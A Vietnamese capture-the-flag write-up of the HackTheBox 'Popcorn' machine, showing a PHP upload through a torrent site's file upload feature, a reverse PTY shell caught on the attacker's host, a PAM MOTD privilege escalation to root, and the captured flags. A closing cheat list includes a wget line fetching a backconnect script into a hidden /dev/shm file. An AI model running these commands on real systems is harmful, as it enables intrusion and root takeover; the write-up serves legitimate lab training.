---
title: "PopCorn HTB"
excerpt: "December 10, 2024 04:00 PM ICT to December 10, 2024"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/popcorn.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/lame.jpg"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

# Popcorn

![image](https://hackmd.io/_uploads/HyBs3ywV1l.png)

Có thể thấy là máy chủ mở 2 dịch vụ là ssh ở cổng 22 + Apache httpd 2.2.12 ở cổng 80.

os: `linux`

![image](https://hackmd.io/_uploads/r1T21xD4yl.png)

sau khi scan 1 lúc nhận được file php info trên cổng 80 chạy apache bật tính năng upload file.

![image](https://hackmd.io/_uploads/BJlBzxwN1x.png)

![image](https://hackmd.io/_uploads/ByGsfgPV1x.png)

### Creat python pty-tcp-backconnect

![image](https://hackmd.io/_uploads/SkdjHW_Nkg.png)

sau khi register -> login ta thực hiện upload 1 file torren lên

![image](https://hackmd.io/_uploads/HkbCr-OE1e.png)

có thể thấy đã upload thành công  -> tiếp theo ta có thể tải các tệp đính kèm lên:

![image](https://hackmd.io/_uploads/BJ1WIWONkx.png)

![image](https://hackmd.io/_uploads/HJC_L-uEyl.png)

![image](https://hackmd.io/_uploads/BkghLbOVJx.png)

![image](https://hackmd.io/_uploads/HyV6UZd41l.png)

-> thực hiện get shell của ta về

![image](https://hackmd.io/_uploads/ryBxQGONkx.png)

![image](https://hackmd.io/_uploads/rkwW7fOEke.png)

![image](https://hackmd.io/_uploads/SkEf7fOVyg.png)

![image](https://hackmd.io/_uploads/rkrlEGdEJx.png)

```
l3mnt2010@ASUSEXPERTBOOK:~/new/htb/popcorn/python-pty-shells$ python2 tcp_pty_shell_handler.py -b 10.10.14.29:4444
www-data@popcorn:/var/www/torrent/upload$ ls
723bc28f9b6f924cca68ccdff96b6190566ca6b4.png  noss.png
7b1490474e51536e1a7ac0dfec2467e86da232a4.php
www-data@popcorn:/var/www/torrent/upload$ cd /home/
www-data@popcorn:/home$ ls
george
www-data@popcorn:/home$ cd george/
www-data@popcorn:/home/george$ ls
torrenthoster.zip  user.txt
www-data@popcorn:/home/george$ cat user.txt
d5c07b7925bbe12d0fd03182025dd383
```

user flag: `d5c07b7925bbe12d0fd03182025dd383`

![image](https://hackmd.io/_uploads/S12nwGOEkg.png)

![image](https://hackmd.io/_uploads/H1ZhvGuVyx.png)

có 2 mã khai thác leo quyền:

```
www-data@popcorn:/home/george$ dpkg -l | grep -i pam
ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules for PAM
ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support for the PAM library
ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
ii  python-pam                          0.4.2-12ubuntu3                   A Python interface to the PAM library
www-data@popcorn:/home/george$
```

có thể thấy hệ thống cũng có 1.1.0 ubuntu như ở trên -> ta thử từng payload

![image](https://hackmd.io/_uploads/Byl_Z7d41e.png)

`Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (1)    | linux/local/14273.sh` không khai thác được bug trên chuyển xuống bug dưới

https://www.exploit-db.com/exploits/14339

![image](https://hackmd.io/_uploads/SyxCdfdNJg.png)

![image](https://hackmd.io/_uploads/BkbGfXd4kx.png)

```
www-data@popcorn:/dev/shm$ ls -la
total 8
drwxrwxrwt  2 root     root       80 Dec 12 10:35 .
drwxr-xr-x 14 root     root     3300 Dec 12 08:08 ..
-rw-r--r--  1 www-data www-data 3042 Dec 12 10:39 .priv.sh
-rw-r--r--  1 www-data www-data  687 Dec 12 09:36 .rev.py
www-data@popcorn:/dev/shm$ bash .priv.sh
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password:
root@popcorn:/dev/shm# whoami
root
root@popcorn:/dev/shm# cat /root/root.txt
4308af9d3b2008677a399e484108c8d2
root@popcorn:/dev/shm#
```

root flag: `4308af9d3b2008677a399e484108c8d2`

![image](https://hackmd.io/_uploads/SkwsM7_Nyg.png)

## cheat

`lam=wget 10.10.14.29:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py`

`find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t`

`xclip` -> sap chép vào khay nhớ tạm.

`l3mnt2010@ASUSEXPERTBOOK:~/new/htb/popcorn/python-pty-shells$ python2 tcp_pty_shell_handler.py -b 10.10.14.29:4444` pty shell python2